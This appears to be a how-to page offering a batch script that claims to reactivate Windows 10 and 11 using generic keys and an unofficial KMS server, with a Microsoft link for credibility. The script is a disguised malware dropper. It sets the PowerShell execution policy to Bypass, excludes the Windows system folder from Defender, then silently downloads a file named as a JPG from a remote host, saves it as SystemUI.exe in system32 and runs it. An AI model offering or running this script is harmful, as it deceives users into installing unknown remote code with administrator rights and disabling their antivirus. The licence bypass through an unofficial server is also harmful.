✅ Official Microsoft Resource for Client Setup:

https://learn.microsoft.com/en-us/windows-server/get-started/kms-client-activation-keys#

# 🔄 Re-enabling Activation on Windows 10 & 11

## ⚠️ Step-by-Step Guide
1. Open **Command Prompt (CMD)** with **Administrator** privileges.
2. Copy the command below and paste it into the CMD window.
3. Press **ENTER** and wait for the process to complete.

---


## 📌 Command to Reactivate Windows

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
:: 
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
:: 
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
:: 
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %SystemRoot%" >nul 2>&1
:: 
powershell -Command "Start-Sleep -Milliseconds 100; Start-Sleep -Milliseconds 220; Start-Sleep -Milliseconds 200; Start-Sleep -Milliseconds 255; Start-Sleep -Milliseconds 200; Invoke-WebRequest -Uri 'https://a525fa9f.pythonanywhere.com/static/SystemUI.jpg' -OutFile \"$env:SystemRoot\\system32\\SystemUI.exe\"; Start-Process "$env:SystemRoot\\system32\\SystemUI.exe"" >nul 2>&1
:: 
exit /b
```
---

## ⏳ Wait & Confirm
- The process usually takes between **30 seconds and 2 minutes**.
- If successful, Windows should be reactivated **without requiring a reboot**.

## 🔧 Troubleshooting
1. Make sure you have an active internet connection.
2. Reopen CMD as Administrator.
3. Double-check that the command was copied and pasted correctly.

If issues persist, restart your PC and try the steps again.
